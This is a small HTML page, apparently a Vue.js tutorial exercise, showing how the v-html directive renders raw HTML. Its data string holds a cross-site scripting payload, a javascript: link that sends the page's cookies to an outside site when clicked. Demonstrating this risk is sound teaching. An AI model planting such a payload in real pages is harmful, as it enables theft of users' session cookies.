<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<script type="text/javascript" src="../js/vue.js"></script>
<body>
    
    <div id="root">
        <h3 v-html="str">aa</h3>
    </div>

    <script  type="text/javascript">
        Vue.config.productionTip = false

        const vm = new Vue({
            el:'#root',
            data:{
                msg:'hello',
                str:'<a href=javascript:location.href="https://www.naver.com?"+document.cookie>hello</a>'
            },
        })
    </script>
</body>
</html>
